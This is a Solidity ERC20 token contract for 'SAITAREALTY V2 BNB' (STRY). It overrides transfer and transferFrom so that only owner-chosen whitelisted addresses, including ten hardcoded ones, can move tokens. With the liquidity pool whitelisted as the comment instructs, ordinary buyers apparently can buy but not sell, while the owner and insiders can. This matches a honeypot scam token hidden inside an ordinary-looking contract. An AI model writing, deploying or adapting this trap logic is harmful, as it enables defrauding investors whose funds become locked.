// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("SAITAREALTY V2 BNB", "STRY") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 12000000 * 10 ** decimals());
        whiteList[0x38e154B93D6fb5363dFD0E7244A5203c5636B906]= true;
        whiteList[0x094638F7E42E976A37eD716A619916FF61Aa019d]=true;
        whiteList[0x84037bAD64072E1CF13c2843ca072c98292d852A]=true;
        whiteList[0xd701D465Eb0b9f2c360f0462481FBe649F44a8CB]=true;
        whiteList[0xA2410c7a47B27297A1014C946dF2Bd8aF6993117]=true;
        whiteList[0x5DE4b81ab65E7EC5c4a774B687A3f10ab5a7E8e5]=true;
        whiteList[0xFbb3242d3dEEF40E674588ec04BEd9A4191481C5]=true;
        whiteList[0x497d979Fe0CDBd35A8a2C2154744c786c395f32c]=true;
        whiteList[0xadEffb86Ef81413e7e1896D262b36A35DD9a2500]=true;
        whiteList[0xE73BBEA0eA9b7bDe73805467B2139A3bc46B687A]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}